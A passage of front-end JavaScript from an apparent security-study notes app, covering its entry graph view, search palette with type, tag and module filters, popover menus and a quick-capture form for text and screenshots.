    var add = h("input", { class:"vt-in vt-topicin", placeholder:"+ subtopic (Enter)", maxlength:"120", "data-native-undo":"",
      onkeydown:function(e){ if(e.key === "Enter" && add.value.trim()){ m.topics.push({ id:rid("t"), name:add.value.trim(), done:false }); commit(); var a = root.querySelector('[data-mod="' + m.id + '"] .vt-topicin'); if(a) a.focus(); } } });
    return h("div", { class:"vt-mdetail", "data-mod":m.id }, [
      h("div", {}, [h("div", { class:"vt-sublabel", text:"subtopics" }), topics, add]),
      h("div", {}, [h("div", { class:"vt-sublabel", text:"entries" }),
        es.length ? h("div", { class:"vt-chips" }, es.map(function(n){ return h("button", { type:"button", class:"vt-chip", text:TYPE_WORD[n.type] + ": " + name(n), onclick:function(){ openEntry(n); } }); }))
          : h("p", { class:"vt-muted vt-small", text:"nothing filed under this module yet." }),
        h("div", { class:"vt-row-acts" }, [
          h("button", { type:"button", class:"vt-link", text:"+ note", onclick:function(){ newEntry("note", { mod:m.id, title:es.some(function(n){ return n.type === "note"; }) ? "" : m.name }); } }),
          h("button", { type:"button", class:"vt-link", text:"+ lab", onclick:function(){ newEntry("lab", { mod:m.id }); } })
        ])])
    ]);
  }

  // ===== GRAPH =====
  var GCOL = { note:"fg", lab:"fg", payload:"accent", http:"muted", method:"fg", capture:"muted" };
  function graphTab(body){
    var G = u.g || (u.g = { types:{ note:1, lab:1, payload:0, http:1, method:1, capture:0 }, links:1, rels:1, mods:0, tags:0, orph:false, tag:"", mod:"",
      find:"", more:false, userView:false, view:{ x:0, y:0, k:1 }, pos:{} });
    var nodes = [], edges = [], byId = {};
    function node(id, label, kind, ref){
      if(byId[id]) return byId[id];
      var ps = G.pos[id], hv = parseInt(hash(id), 36), a = (hv % 6283) / 1000, r = 40 + (hv % 260);
      var nd = { id:id, label:label, kind:kind, ref:ref, x:ps ? ps.x : Math.cos(a) * r, y:ps ? ps.y : Math.sin(a) * r, vx:0, vy:0, deg:0, nb:[] };
      byId[id] = nd; nodes.push(nd);
      return nd;
    }
    function edge(a, b, kind, t){ if(!a || !b || a === b) return; edges.push([a, b, kind, t]); a.deg++; b.deg++; a.nb.push(b); b.nb.push(a); }
    var shown = V.notes.filter(function(n){ return G.types[n.type] && (!G.tag || tagsOf(n).indexOf(G.tag) >= 0) && (!G.mod || n.mod === G.mod); });
    shown.forEach(function(n){ node("n:" + n.id, name(n), n.type, n); });
    shown.forEach(function(n){
      var a = byId["n:" + n.id], S = scan(n);
      if(G.links) S.links.forEach(function(t){ var tn = byTitle(t); if(tn) edge(a, byId["n:" + tn.id], "link"); else if(!G.orph) edge(a, node("g:" + lower(t), t, "ghost", t), "link"); });
      if(G.rels) n.rels.forEach(function(r){ edge(a, byId["n:" + r.id], "rel", r.t); });
      if(G.mods && n.mod){ var m = modById(n.mod); if(m) edge(a, node("m:" + m.id, m.name, "mod", m), "mod"); }
      if(G.tags) tagsOf(n).forEach(function(t){ edge(a, node("t:" + t, "#" + t, "tag", t), "tag"); });
    });
    if(G.orph){
      var keep = nodes.filter(function(x){ return x.kind !== "ghost" && x.kind !== "mod" && x.kind !== "tag" && !connected(x.ref); });
      nodes = keep; edges = [];
    }
    var nRel = edges.filter(function(e){ return e[2] === "rel"; }).length, nLink = edges.filter(function(e){ return e[2] === "link"; }).length;
    var orphans = V.notes.filter(function(n){ return n.type !== "capture" && n.type !== "payload" && !connected(n); }).length;
    function opt(key, label, sw){
      return h("label", { class:"vt-opt" }, [h("input", { type:"checkbox", checked:G[key] ? true : null, onchange:function(e){ G[key] = e.target.checked; draw(); } }),
        sw ? h("i", { class:"vt-sw " + sw }) : null, label]);
    }
    var tagSel = h("select", { class:"vt-in vt-sel", "aria-label":"tag", onchange:function(){ G.tag = tagSel.value; draw(); } },
      [h("option", { value:"", text:"every tag" })].concat(uniq([].concat.apply([], V.notes.map(tagsOf))).sort().map(function(t){ return h("option", { value:t, text:"#" + t }); })));
    tagSel.value = G.tag;
    var modSel = h("select", { class:"vt-in vt-sel", "aria-label":"module", onchange:function(){ G.mod = modSel.value; draw(); } },
      [h("option", { value:"", text:"every module" })].concat(V.modules.map(function(m){ return h("option", { value:m.id, text:m.name }); })));
    modSel.value = G.mod;
    // one plain row; the rest waits behind "more filters"
    var find = h("input", { class:"vt-in vt-gfind", type:"search", placeholder:"find in graph", value:G.find || "", spellcheck:"false", "data-native-undo":"", "aria-label":"find in graph",
      oninput:function(){ G.find = find.value; paint(); },
      onkeydown:function(e){ if(e.key === "Enter"){ e.preventDefault(); var m = matches()[0]; if(m) centerOn(m); } } });
    body.appendChild(h("div", { class:"vt-filters" }, [
      h("div", { class:"vt-toggle" }, [
        h("button", { type:"button", class:"vt-tog" + (G.orph ? "" : " on"), text:"everything", onclick:function(){ G.orph = false; G.userView = false; draw(); } }),
        h("button", { type:"button", class:"vt-tog" + (G.orph ? " on" : ""), text:"not connected yet (" + orphans + ")",
          title:"entries connected to nothing: open one and press + connect", onclick:function(){ G.orph = true; G.userView = false; draw(); } })
      ]),
      find,
      h("button", { type:"button", class:"vt-link", text:"fit", title:"zoom to show everything", onclick:function(){ G.userView = false; fit(); paint(); } }),
      h("button", { type:"button", class:"vt-link" + (G.more ? " on" : ""), text:G.more ? "fewer filters" : "more filters", onclick:function(){ G.more = !G.more; draw(); } })
    ]));
    if(G.more){
      body.appendChild(h("div", { class:"vt-filters vt-more" }, [h("span", { class:"vt-rell", text:"show" })].concat(TYPES.map(function(t){
        return h("label", { class:"vt-opt" }, [h("input", { type:"checkbox", checked:G.types[t] ? true : null, onchange:function(e){ G.types[t] = e.target.checked ? 1 : 0; draw(); } }),
          h("i", { class:"vt-sw k-" + t }), TYPE_WORD[t] + "s"]);
      }))));
      body.appendChild(h("div", { class:"vt-filters vt-more" }, [h("span", { class:"vt-rell", text:"lines" }), opt("links", "[[links]] in the text", "e-link"), opt("rels", "connections", "e-rel"),
        opt("mods", "modules", "k-mod"), opt("tags", "tags", "k-tag"), tagSel, modSel]));
    }
    var canvas = h("canvas", { class:"vt-gc", "aria-label":"graph of entries and how they connect" });
    var info = h("div", { class:"vt-ghint vt-muted vt-small", text:"click a square to open it · drag to move · scroll to zoom" });
    body.appendChild(h("div", { class:"vt-gwrap" }, [canvas, info]));
    function key(sw, label){ return h("span", {}, [h("i", { class:"vt-sw " + sw }), label]); }
    body.appendChild(h("div", { class:"vt-glegend" }, [key("k-note", "note"), key("k-lab", "lab"), key("k-method", "methodology"),
      G.types.payload ? key("k-payload", "payload") : null, G.types.http ? key("k-http", "request") : null,
      key("e-rel", "connection (+ connect)"), key("e-link", "[[link]] in the text"), key("k-ghost", "not written yet: click to write it"),
      h("span", { class:"vt-muted", text:plural(nodes.length, "square") + " · " + plural(nRel + nLink, "line") })]));
    var g2 = canvas.getContext("2d"), dpr = window.devicePixelRatio || 1, W = 0, H = 0;
    var css = getComputedStyle(document.documentElement);
    var C = { fg:css.getPropertyValue("--fg").trim() || "#e7e7e7", muted:css.getPropertyValue("--muted").trim() || "#8f8f8f",
              line:css.getPropertyValue("--line").trim() || "#2d2d2d", accent:css.getPropertyValue("--accent").trim() || "#e5484b",
              bg:css.getPropertyValue("--bg").trim() || "#0f0f0f", font:getComputedStyle(document.body).fontFamily };
    var alpha = nodes.every(function(x){ return G.pos[x.id]; }) ? 0.25 : 1, raf = 0, drag = null, pan = null, hover = null, moved = false;
    var cur_ = u.sel[TAB_TYPE[u.tab]] || u.sel.note;
    function size(x){ return x.kind === "mod" ? 7 : x.kind === "tag" ? 3 : x.kind === "payload" || x.kind === "capture" ? 3 : 3.5 + Math.min(Math.sqrt(x.deg) * 1.5, 7); }
    function tick(){
      var i, j, a, b, dx, dy, d2, d, f;
      for(i = 0; i < nodes.length; i++){
        a = nodes[i];
        for(j = i + 1; j < nodes.length; j++){
          b = nodes[j]; dx = a.x - b.x; dy = a.y - b.y; d2 = dx * dx + dy * dy;
          if(d2 > 160000) continue;
          if(d2 < 1){ dx = Math.random() - 0.5; dy = Math.random() - 0.5; d2 = 1; }
          d = Math.sqrt(d2); f = 1200 / d2;
          a.vx += dx / d * f; a.vy += dy / d * f; b.vx -= dx / d * f; b.vy -= dy / d * f;
        }
      }
      edges.forEach(function(e){
        a = e[0]; b = e[1]; dx = b.x - a.x; dy = b.y - a.y; d = Math.sqrt(dx * dx + dy * dy) || 1;
        f = (d - (e[2] === "rel" ? 80 : 60)) * 0.04; a.vx += dx / d * f; a.vy += dy / d * f; b.vx -= dx / d * f; b.vy -= dy / d * f;
      });
      nodes.forEach(function(x){
        x.vx -= x.x * 0.008; x.vy -= x.y * 0.008;
        if(x === drag){ x.vx = x.vy = 0; return; }
        x.vx = Math.max(-30, Math.min(30, x.vx)); x.vy = Math.max(-30, Math.min(30, x.vy));
        x.x += x.vx * alpha; x.y += x.vy * alpha; x.vx *= 0.6; x.vy *= 0.6;
        G.pos[x.id] = { x:x.x, y:x.y };
      });
      alpha *= 0.98;
    }
    // the view zooms to fit everything until you pan or zoom it yourself
    function fit(){
      if(!nodes.length || !W) return;
      var x0 = Infinity, y0 = Infinity, x1 = -Infinity, y1 = -Infinity;
      nodes.forEach(function(x){ x0 = Math.min(x0, x.x); y0 = Math.min(y0, x.y); x1 = Math.max(x1, x.x); y1 = Math.max(y1, x.y); });
      var k = Math.max(0.25, Math.min((W - 120) / Math.max(x1 - x0, 1), (H - 100) / Math.max(y1 - y0, 1), 2.2));
      G.view = { x:-(x0 + x1) / 2 * k, y:-(y0 + y1) / 2 * k, k:k };
    }
    function matches(){
      var q = lower(G.find);
      return q.length < 2 ? [] : nodes.filter(function(x){ return x.label.toLowerCase().indexOf(q) >= 0; });
    }
    function centerOn(x){ G.userView = true; var k = Math.max(G.view.k, 1.4); G.view = { x:-x.x * k, y:-x.y * k, k:k }; paint(); }
    function paint(){
      var w = canvas.clientWidth, hh = canvas.clientHeight;
      if(!w) return;
      if(w !== W || hh !== H){ W = w; H = hh; canvas.width = W * dpr; canvas.height = H * dpr; if(!G.userView) fit(); }
      var v = G.view, fm = null;
      var found = matches();
      if(found.length){ fm = {}; found.forEach(function(x){ fm[x.id] = 1; }); }
      g2.setTransform(dpr, 0, 0, dpr, 0, 0);
      g2.clearRect(0, 0, W, H);
      g2.save();
      g2.translate(W / 2 + v.x, H / 2 + v.y); g2.scale(v.k, v.k);
      edges.forEach(function(e){
        var on = hover && (e[0] === hover || e[1] === hover), rel = e[2] === "rel";
        g2.globalAlpha = (hover && !on) || (!hover && fm && !fm[e[0].id] && !fm[e[1].id]) ? 0.2 : rel ? 0.95 : 0.8;
        g2.strokeStyle = rel ? C.accent : on ? C.fg : C.line;
        g2.lineWidth = (rel ? 1.6 : 1.1) / v.k;
        g2.setLineDash(e[2] === "mod" || e[2] === "tag" ? [3 / v.k, 3 / v.k] : []);
        g2.beginPath(); g2.moveTo(e[0].x, e[0].y); g2.lineTo(e[1].x, e[1].y); g2.stroke();
        g2.setLineDash([]);
        if(rel){
          // arrowhead at the target's edge
          var dx = e[1].x - e[0].x, dy = e[1].y - e[0].y, d = Math.sqrt(dx * dx + dy * dy) || 1, s = size(e[1]) + 3;
          var tx = e[1].x - dx / d * s, ty = e[1].y - dy / d * s, ux = dx / d, uy = dy / d, al = 6 / v.k;
          g2.fillStyle = C.accent;
          g2.beginPath(); g2.moveTo(tx, ty); g2.lineTo(tx - ux * al - uy * al * 0.6, ty - uy * al + ux * al * 0.6); g2.lineTo(tx - ux * al + uy * al * 0.6, ty - uy * al - ux * al * 0.6); g2.closePath(); g2.fill();
          if(on){
            g2.font = (10 / v.k) + "px " + C.font; g2.textAlign = "center"; g2.textBaseline = "bottom";
            g2.fillStyle = C.accent; g2.globalAlpha = 1;
            g2.fillText(REL[e[3]].f, (e[0].x + e[1].x) / 2, (e[0].y + e[1].y) / 2 - 2 / v.k);
          }
        }
      });
      g2.globalAlpha = 1;
      nodes.forEach(function(x){
        var s = size(x), me = x.ref && x.ref.id === cur_;
        var dim = hover ? x !== hover && hover.nb.indexOf(x) < 0 : !!(fm && !fm[x.id]);
        g2.globalAlpha = dim ? 0.25 : 1;
        g2.lineWidth = 2 / v.k;
        if(fm && fm[x.id]){ g2.strokeStyle = C.accent; g2.strokeRect(x.x - s - 4 / v.k, x.y - s - 4 / v.k, (s + 4 / v.k) * 2, (s + 4 / v.k) * 2); }
        if(x.kind === "ghost"){ g2.strokeStyle = C.muted; g2.setLineDash([2 / v.k, 2 / v.k]); g2.strokeRect(x.x - s, x.y - s, s * 2, s * 2); g2.setLineDash([]); }
        else if(x.kind === "mod"){ g2.fillStyle = C.bg; g2.fillRect(x.x - s, x.y - s, s * 2, s * 2); g2.strokeStyle = C.accent; g2.strokeRect(x.x - s, x.y - s, s * 2, s * 2); }
        else if(x.kind === "tag"){ g2.fillStyle = C.muted; g2.fillRect(x.x - s, x.y - s, s * 2, s * 2); }
        else if(x.kind === "lab"){ g2.fillStyle = C.bg; g2.fillRect(x.x - s, x.y - s, s * 2, s * 2); g2.strokeStyle = me || x === hover ? C.accent : C.fg; g2.strokeRect(x.x - s, x.y - s, s * 2, s * 2); }
        else if(x.kind === "method"){ g2.save(); g2.translate(x.x, x.y); g2.rotate(Math.PI / 4); g2.fillStyle = me || x === hover ? C.accent : C.fg; g2.fillRect(-s * 0.8, -s * 0.8, s * 1.6, s * 1.6); g2.restore(); }
        else{ g2.fillStyle = me || x === hover ? C.accent : C[GCOL[x.kind]] || C.fg; g2.fillRect(x.x - s, x.y - s, s * 2, s * 2); }
      });
      g2.font = (11 / v.k) + "px " + C.font;
      g2.textAlign = "center"; g2.textBaseline = "top";
      nodes.forEach(function(x){
        var near = hover && (x === hover || hover.nb.indexOf(x) >= 0), hit_ = fm && fm[x.id];
        if(!(near || hit_ || v.k >= 1.25 || x.kind === "mod" || x.deg >= 3 || (x.ref && x.ref.id === cur_) || nodes.length <= 30)) return;
        g2.globalAlpha = (hover && !near) || (!hover && fm && !hit_) ? 0.25 : 1;
        g2.fillStyle = x === hover ? C.fg : x.kind === "mod" ? C.accent : C.muted;
        var label = x.label.length > 32 ? x.label.slice(0, 31) + "…" : x.label;
        g2.fillText(label, x.x, x.y + size(x) + 3 / v.k);
      });
      g2.restore();
    }
    function frame(){
      raf = 0;
      if(!canvas.isConnected) return;
      tick();
      if(!G.userView) fit();
      paint();
      if(alpha > 0.02 || drag) raf = requestAnimationFrame(frame);
    }
    function kick(a){ alpha = Math.max(alpha, a || 0.3); if(!raf) raf = requestAnimationFrame(frame); }
    // redraw (and refit) when the canvas changes size, e.g. the window or the focus mode
    var ro = window.ResizeObserver ? new ResizeObserver(function(){ if(canvas.isConnected) paint(); }) : null;
    if(ro) ro.observe(canvas);
    stopGraph = function(){ if(raf) cancelAnimationFrame(raf); raf = 0; if(ro){ ro.disconnect(); ro = null; } };
    function world(e){
      var r = canvas.getBoundingClientRect(), v = G.view;
      return { sx:e.clientX - r.left, sy:e.clientY - r.top, x:(e.clientX - r.left - W / 2 - v.x) / v.k, y:(e.clientY - r.top - H / 2 - v.y) / v.k };
    }
    function hit(pt){
      var best = null, bd = Infinity;
      nodes.forEach(function(x){ var d = Math.max(Math.abs(x.x - pt.x), Math.abs(x.y - pt.y)); if(d <= size(x) + 5 / G.view.k && d < bd){ bd = d; best = x; } });
      return best;
    }
    canvas.addEventListener("pointerdown", function(e){
      var pt = world(e); moved = false;
      try{ canvas.setPointerCapture(e.pointerId); }catch(_){}
      drag = hit(pt);
      if(!drag) pan = { sx:pt.sx, sy:pt.sy, x:G.view.x, y:G.view.y };
      else kick(0.3);
    });
    canvas.addEventListener("pointermove", function(e){
      var pt = world(e);
      if(drag){ moved = true; G.userView = true; drag.x = pt.x; drag.y = pt.y; G.pos[drag.id] = { x:pt.x, y:pt.y }; kick(0.3); return; }
      if(pan){ if(Math.abs(pt.sx - pan.sx) + Math.abs(pt.sy - pan.sy) > 3){ moved = true; G.userView = true; } G.view.x = pan.x + pt.sx - pan.sx; G.view.y = pan.y + pt.sy - pan.sy; paint(); return; }
      var hv = hit(pt);
      if(hv !== hover){
        hover = hv; canvas.style.cursor = hv ? "pointer" : "grab";
        info.textContent = hv ? (hv.kind === "ghost" ? "“" + hv.label + "” doesn't exist yet: click to write it" : hv.kind === "mod" ? "module: " + hv.label : hv.kind === "tag" ? hv.label : TYPE_WORD[hv.kind] + ": " + hv.label + " · " + plural(hv.deg, "connection") + " · click to open")
          : "click a square to open it · drag to move · scroll to zoom";
        paint();
      }
    });
    canvas.addEventListener("pointerup", function(){
      var d = drag;
      drag = null; pan = null;
      if(d && !moved){
        if(d.kind === "ghost") newEntry("note", { title:d.ref, tpl:"blank" });
        else if(d.kind === "mod") showModule(d.ref);
        else if(d.kind === "tag"){ u.tag = d.ref; u.mod = ""; go("notes"); }
        else openEntry(d.ref);
      }
    });
    canvas.addEventListener("pointercancel", function(){ drag = null; pan = null; });
    canvas.addEventListener("pointerleave", function(){ if(hover && !drag){ hover = null; paint(); } });
    canvas.addEventListener("wheel", function(e){
      e.preventDefault();
      G.userView = true;
      var pt = world(e), v = G.view, k = Math.min(4, Math.max(0.25, v.k * Math.exp(-e.deltaY * 0.0015)));
      v.x = pt.sx - W / 2 - pt.x * k; v.y = pt.sy - H / 2 - pt.y * k; v.k = k;
      paint();
    }, { passive:false });
    canvas.style.cursor = "grab";
    requestAnimationFrame(function(){ paint(); kick(alpha); });
  }

  // ===== SEARCH (Ctrl+K): every entry, every field =====
  var TYPE_ALIAS = { note:"note", notes:"note", lab:"lab", labs:"lab", payload:"payload", payloads:"payload", http:"http", request:"http", requests:"http",
    method:"method", methods:"method", methodology:"method", capture:"capture", inbox:"capture" };
  function palette(){
    closeMenus();
    var back = h("div", { class:"vt-palback" }), inp, list, sel = 0, results = [];
    var cmds = TABS.map(function(t){ return { t:"go to " + t, go:function(){ go(t); } }; })
      .concat(NOTE_TPL.map(function(t){ return { t:"new " + t.name, go:function(){ newEntry("note", { tpl:t.id }); } }; }))
      .concat([{ t:"new lab", go:function(){ newEntry("lab", {}); } }, { t:"new request", go:function(){ go("http"); } },
               { t:"new payload", go:function(){ newEntry("payload", {}); } }, { t:"new methodology", go:function(){ newEntry("method", {}); } },
               { t:"quick capture", go:function(){ capture(); } }]);
    function score(t, q){
      t = t.toLowerCase();
      if(!q) return 1;
      var i = t.indexOf(q);
      if(i === 0) return 100 - t.length * 0.01;
      if(i > 0) return 70 - i * 0.1;
      var j = 0, gaps = 0, last = -1;
      for(var c = 0; c < t.length && j < q.length; c++) if(t.charAt(c) === q.charAt(j)){ if(last >= 0) gaps += c - last - 1; last = c; j++; }
      return j === q.length ? Math.max(1, 40 - gaps) : 0;
    }
    function hay(n){ return n.title + "\n" + n.body + (n.pay ? "\n" + n.pay.code : "") + (n.http ? "\n" + n.http.req + "\n" + n.http.res : "") + (n.lab ? "\n" + n.lab.platform : ""); }
    function snippet(text, q){
      var i = text.toLowerCase().indexOf(q);
      if(i < 0) return "";
      var s = Math.max(0, i - 40), e = Math.min(text.length, i + q.length + 60);
      function flat(x){ return esc(x.replace(/\s+/g, " ")); }
      return (s ? "…" : "") + flat(text.slice(s, i)) + "<mark>" + flat(text.slice(i, i + q.length)) + "</mark>" + flat(text.slice(i + q.length, e)) + (e < text.length ? "…" : "");
    }
    function parse(q){
      var o = { words:[], type:"", tag:"", mod:"" };
      q.split(/\s+/).forEach(function(w){
        var m;
        if((m = /^type:(\w+)$/i.exec(w)) && TYPE_ALIAS[m[1].toLowerCase()]) o.type = TYPE_ALIAS[m[1].toLowerCase()];
        else if((m = /^(?:tag:|#)([\w\-\/]+)$/i.exec(w))) o.tag = m[1].toLowerCase();
        else if((m = /^mod:(.+)$/i.exec(w))) o.mod = m[1].toLowerCase();
        else if(w) o.words.push(w.toLowerCase());
      });
      o.q = o.words.join(" ");
      return o;
    }
    function update(){
      var P = parse(inp.value.trim()), q = P.q;
      results = [];
      V.notes.forEach(function(n){
        if(P.type && n.type !== P.type) return;
        if(P.tag && tagsOf(n).indexOf(P.tag) < 0) return;
        if(P.mod){ var m = modById(n.mod); if(!m || m.name.toLowerCase().indexOf(P.mod) < 0) return; }
        var s = q ? score(name(n), q) : 1 + n.updatedAt / 1e15, sn = "";
        if(q.length >= 2){
          var text = hay(n), all = P.words.every(function(w){ return text.toLowerCase().indexOf(w) >= 0; });
          if(all){ sn = snippet(text, P.words[0]); if(s < 20) s = 20 + Math.min(P.words.length, 5); }
          else if(s < 40) s = 0;
        }
        if(s > 0) results.push({ s:s, kind:"entry", n:n, sn:sn });
      });
      results.sort(function(a, b){ return b.s - a.s || b.n.updatedAt - a.n.updatedAt; });
      results = results.slice(0, 14);
      cmds.forEach(function(c){ var s = q ? score(c.t, q) : 0; if(s > 30) results.push({ kind:"cmd", c:c }); });
      if(q && !P.type && !P.tag && !byTitle(inp.value.trim())) results.push({ kind:"new", t:inp.value.trim() });
      sel = Math.min(sel, Math.max(0, results.length - 1));
      list.innerHTML = "";
      results.forEach(function(r, i){
        var b = h("button", { type:"button", class:"vt-pi" + (i === sel ? " on" : ""), onmousedown:function(e){ e.preventDefault(); sel = i; pick(); } });
        if(r.kind === "entry"){
          b.appendChild(h("b", {}, [h("span", { class:"vt-badge t-" + r.n.type, text:TYPE_WORD[r.n.type] }), " " + name(r.n)]));
          b.appendChild(r.sn ? h("small", { html:r.sn }) : h("small", { text:ago(r.n.updatedAt) }));
        }else if(r.kind === "cmd") b.appendChild(h("b", { class:"vt-pcmd", text:"→ " + r.c.t }));
        else b.appendChild(h("b", { class:"vt-pcmd", text:"+ new note “" + r.t + "”" }));
        list.appendChild(b);
      });
      if(!results.length) list.appendChild(h("p", { class:"vt-muted vt-small vt-pempty", text:"nothing found. filters: type:lab  #xss  mod:sql" }));
      var on = list.children[sel];
      if(on && on.scrollIntoView) on.scrollIntoView({ block:"nearest" });
    }
    function close(){ if(back.parentNode) back.parentNode.removeChild(back); menus = menus.filter(function(m){ return m !== back; }); }
    function pick(){
      var r = results[sel];
      if(!r) return;
      close();
      if(r.kind === "entry") openEntry(r.n);
      else if(r.kind === "cmd") r.c.go();
      else newEntry("note", { title:r.t, tpl:"blank" });
    }
    inp = h("input", { class:"vt-pin-in", placeholder:"search everything · type:lab #xss mod:sql filter · or type a title to make a note", spellcheck:"false", "data-native-undo":"", "aria-label":"search",
      oninput:function(){ sel = 0; update(); },
      onkeydown:function(e){
        if(e.key === "ArrowDown" || e.key === "ArrowUp"){ e.preventDefault(); if(results.length){ sel = (sel + (e.key === "ArrowDown" ? 1 : -1) + results.length) % results.length; update(); } }
        else if(e.key === "Enter"){ e.preventDefault(); pick(); }
        else if(e.key === "Escape"){ e.preventDefault(); e.stopPropagation(); close(); }
      } });
    list = h("div", { class:"vt-plist" });
    back.appendChild(h("div", { class:"vt-pal", role:"dialog", "aria-label":"search" }, [inp, list]));
    back.addEventListener("mousedown", function(e){ if(e.target === back) close(); });
    document.body.appendChild(back);
    menus.push(back);
    inp.focus();
    update();
  }

  // ----- shared datalists for title pickers -----
  function datalists(){
    root.appendChild(h("datalist", { id:"vt-dl-" + p.id }, uniq(V.notes.filter(function(n){ return n.title.trim() && n.type !== "capture"; }).map(function(n){ return n.title.trim(); }))
      .map(function(t){ return h("option", { value:t }); })));
    root.appendChild(h("datalist", { id:"vt-plat" }, PLATFORMS.map(function(t){ return h("option", { value:t }); })));
    root.appendChild(h("datalist", { id:"vt-langs" }, ["text", "bash", "powershell", "sql", "http", "html", "js", "python", "php", "xml", "json"].map(function(t){ return h("option", { value:t }); })));
  }
  active = {
    root:root, page:p, capture:capture,
    key:function(e){
      var k = (e.key || "").toLowerCase(), code = e.code || "";
      if((e.ctrlKey || e.metaKey) && !e.altKey && !e.shiftKey && k === "k"){ e.preventDefault(); palette(); return; }
      if(e.altKey && !e.ctrlKey && !e.metaKey && !e.shiftKey){
        var dm = /^Digit(\d)$/.exec(code);
        if(dm){ e.preventDefault(); go(TABS[(+dm[1] + 9) % 10]); return; }
        if(code === "KeyN"){ e.preventDefault(); if(TAB_TYPE[u.tab]) newIn(u.tab, root.querySelector(".vt-acts .vt-primary")); else newEntry("note", { tpl:"blank" }); return; }
        if(code === "Backslash"){ e.preventDefault(); toggleList(); return; }
        if(code === "KeyM"){ e.preventDefault(); toggleFocus(); return; }
      }
      if(e.ctrlKey || e.metaKey || e.altKey || menus.length || isTyping(e.target)) return;
      if(e.key === "?"){ e.preventDefault(); keysMenu(root.querySelector(".vt-acts .vt-link:nth-child(3)") || root); return; }
      if(u.tab === "review" && reviewKey) reviewKey(e);
    }
  };
  var want = pendingShow[p.id];
  delete pendingShow[p.id];
  if(want === "finding"){ newEntry("note", { tpl:"finding" }); return; }
  if(want && TABS.indexOf(want) >= 0){ u.tab = want; u.review = null; u.showEd = false; if(TAB_TYPE[want]) u.sel[TAB_TYPE[want]] = ""; }
  draw();
}

// ---------- popovers: menus, search, capture, lightbox ----------
// all close on Esc, a click outside, or a redraw
var menus = [];
function closeMenus(){ menus.forEach(function(m){ if(m.parentNode) m.parentNode.removeChild(m); }); menus = []; }
function openMenu(anchor, items){
  closeMenus();
  var m = h("div", { class:"vt-menu" }, items);
  document.body.appendChild(m);
  var r = anchor.getBoundingClientRect ? anchor.getBoundingClientRect() : { right:200, bottom:100 };
  m.style.left = Math.max(8, Math.min(r.right - m.offsetWidth, window.innerWidth - m.offsetWidth - 8)) + "px";
  m.style.top = Math.max(8, Math.min(r.bottom + 6, window.innerHeight - m.offsetHeight - 8)) + "px";
  menus.push(m);
}
document.addEventListener("mousedown", function(e){
  menus.slice().forEach(function(m){
    if(m.classList.contains("vt-menu") && !m.contains(e.target)){ if(m.parentNode) m.parentNode.removeChild(m); menus = menus.filter(function(x){ return x !== m; }); }
  });
});
window.addEventListener("scroll", function(){ if(menus.some(function(m){ return m.classList.contains("vt-menu"); })) closeMenus(); });

// ---------- quick capture ----------
function touchAct(V){ var t = today(), a = V.act[t]; if(!a || !a.e) V.act[t] = { e:1, r:a ? a.r : 0, ok:a ? a.ok || 0 : 0 }; }
// getV() returns the vault to save into (looked up when saving, so an undo in
// between can't leave it writing to an old copy)
function captureForm(getV, save, done){
  var img = null;
  var ta = h("textarea", { class:"vt-in vt-capin", rows:"4", spellcheck:"false", "data-native-undo":"", "aria-label":"capture",
    placeholder:"a thought, a payload, a URL, a screenshot (paste it). Ctrl+Enter saves to the inbox." });
  var thumb = h("div", { class:"vt-capimg" }), status = h("span", { class:"vt-muted vt-small", role:"status" });
  function setImg(d){
    img = d; thumb.innerHTML = "";
    if(d){ thumb.appendChild(h("img", { src:d, alt:"pasted screenshot" })); thumb.appendChild(h("button", { type:"button", class:"vt-link", text:"remove", onclick:function(){ setImg(null); } })); }
  }
  ta.addEventListener("paste", function(e){ var f = imageFrom(e.clipboardData); if(f){ e.preventDefault(); readImage(f, setImg); } });
  ta.addEventListener("dragover", function(e){ e.preventDefault(); });
  ta.addEventListener("drop", function(e){ var f = imageFrom(e.dataTransfer); if(f){ e.preventDefault(); readImage(f, setImg); } });
  function keep(type){
    var V = getV();
    if(!V){ status.textContent = "make a cwes notes page first"; return; }
    var text = ta.value.replace(/\s+$/, "");
    if(!text.trim() && !img){ ta.focus(); return; }
    var pic = "";
    if(img){ var id = "i" + Math.random().toString(36).slice(2, 10); V.imgs[id] = img; pic = "![screenshot](img:" + id + ")"; }
    var url = /^https?:\/\/\S+$/.test(text.trim()) ? text.trim() : "";
    var title = url ? url.replace(/^https?:\/\//, "").slice(0, 90) : firstLine(text) || (img ? "screenshot " + today() : "capture");
    var e = type === "payload" ? entry("payload", title, pic, { pay:{ cat:"payload", lang:"text", code:text } })
      : entry(type, title, [text, pic].filter(Boolean).join("\n\n"));
    V.notes.push(e); touchAct(V);
    save();
    ta.value = ""; setImg(null);
    status.textContent = "saved to " + (type === "capture" ? "the inbox" : type + "s");
    if(done) done(e, type);
  }
  ta.addEventListener("keydown", function(e){ if(e.key === "Enter" && (e.ctrlKey || e.metaKey)){ e.preventDefault(); keep("capture"); } });
  return { focus:function(){ ta.focus(); }, el:h("div", { class:"vt-capform" }, [ta, thumb, h("div", { class:"vt-row-acts" }, [
    h("button", { type:"button", class:"vt-btn vt-primary", text:"inbox", title:"Ctrl+Enter", onclick:function(){ keep("capture"); } }),
    h("button", { type:"button", class:"vt-btn", text:"as payload", onclick:function(){ keep("payload"); } }),
    h("button", { type:"button", class:"vt-btn", text:"as note", onclick:function(){ keep("note"); } }),
    status])]) };
}
function captureBox(getV, save, done){
  closeMenus();
  var back = h("div", { class:"vt-palback" });
  function close(){ if(back.parentNode) back.parentNode.removeChild(back); menus = menus.filter(function(m){ return m !== back; }); }
  var f = captureForm(getV, save, function(e, type){ setTimeout(close, 450); if(done) done(e, type); });
  back.appendChild(h("div", { class:"vt-pal vt-cap", role:"dialog", "aria-label":"quick capture" }, [h("div", { class:"vt-caphead", text:"quick capture" }), f.el]));
  back.addEventListener("mousedown", function(e){ if(e.target === back) close(); });
  document.body.appendChild(back);
  menus.push(back);
  f.focus();
}
// index.html hands over { page(), save(), go(id) } so Alt+C works on every page
function attach(api){ attached = api; }
// a game quest opens the notes on a tab: "labs", "review", or "finding" (a new finding note);
// picked up by the next mount of that page
var pendingShow = {};
function show(pageId, what){ pendingShow[pageId] = String(what || ""); }

document.addEventListener("keydown", function(e){
  if(e.key === "Escape" && menus.length){ closeMenus(); return; }
  var live = active && active.root.isConnected && !active.root.hidden;
  // Alt+C: capture from anywhere (Option+C types a character on a Mac, so not while typing there)
  if(e.altKey && !e.ctrlKey && !e.metaKey && !e.shiftKey && e.code === "KeyC" && !(isTyping(e.target) && /Mac/.test(navigator.platform))){
    if(live){ e.preventDefault(); active.capture(); return; }
    var pg = attached && attached.page();
    if(pg){
      e.preventDefault();
